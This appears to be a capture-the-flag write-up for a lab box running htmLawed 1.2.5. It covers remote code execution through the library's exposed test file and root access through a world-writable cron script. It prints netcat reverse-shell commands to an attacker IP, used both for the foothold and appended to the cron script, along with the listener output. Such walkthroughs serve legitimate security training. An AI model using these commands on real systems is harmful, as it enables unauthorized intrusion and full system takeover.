#Linux #htmLawed #RCE #BurpSuite #CronJob #WritableScript #PrivEsc

## Overview

Law runs htmLawed 1.2.5, an HTML sanitisation library with its test file exposed at the web root. The test file has a known RCE vulnerability, but the request has to be sent to `/` rather than the expected path to get a response. From there, a world-writable cleanup script runs as a cron job under root, and appending a reverse shell to it closes the box.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: htmLawed (1.2.5) test
```

The HTTP title immediately revealed the application: **htmLawed 1.2.5**. No directory enumeration was needed, the version was in the response headers.

## Foothold

### htmLawed 1.2.5, RCE via Test File

htmLawed 1.2.5 exposes `htmLawedTest.php`, a developer test interface that passes input through the library and displays the processed result. This file has a known RCE vulnerability because it uses `assert()` on attacker-controlled input.

> **Why `assert()` equals RCE:** PHP's `assert()` function can evaluate a string as PHP code when passed a string argument. If user input reaches `assert()` without sanitisation, it functions identically to `eval()`. The htmLawed test file passes `$_POST['text']` through a code path that ends up in `assert()`.

The default request path sends `POST /htmLawedTest.php`, which returns a 404 on this host. The file is served from the web root, so the request needs to go to `/` instead. Intercepting the request in Burp and changing:

```http
POST /htmLawedTest.php HTTP/1.1
```

to:

```http
POST / HTTP/1.1
```

Confirmed RCE, a test input of `id` returned:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Sent the same modified request with an nc reverse shell as the command:

```sh
nc 192.168.45.244 80 -e /bin/sh
```

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.190] 51578
whoami
www-data
```

Shell upgraded:

```sh
script /dev/null -c /bin/bash
```

## Privilege Escalation

### World-Writable Cron Script

Manual inspection found a world-readable and world-writable script:

```
/var/www/cleanup.sh
```

Contents:

```bash
#!/bin/bash

rm -rf /var/log/apache2/error.log
rm -rf /var/log/apache2/access.log
```

> **Why writable cron scripts are a direct path to root:** the script's content doesn't matter, what matters is who runs it and whether it can be modified. If a privileged account (including root) executes this script on a schedule, appending a command to it executes that command at the same privilege level. No SUID needed, no exploits.

Appended a reverse shell:

```sh
echo 'nc 192.168.45.244 443 -e /bin/bash' >> cleanup.sh
```

When the cron fired:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.190] 35412
whoami
root
```

## Root

```sh
cat proof.txt
‹redacted›
```

## Takeaways

- **Version in the HTTP title is the fastest route to an exploit.** The title `htmLawed (1.2.5) test` skipped all web enumeration and pointed directly at the CVE.
- **Burp path modification is the fix for "endpoint exists but returns 404."** The application responded at `/` but not at the named file path; a single request edit resolved it.
- **World-writable scripts run by root are trivial to exploit.** Check file permissions on anything in `/var/www/`, `/opt/`, or `/usr/local/` as one of the first post-shell steps.
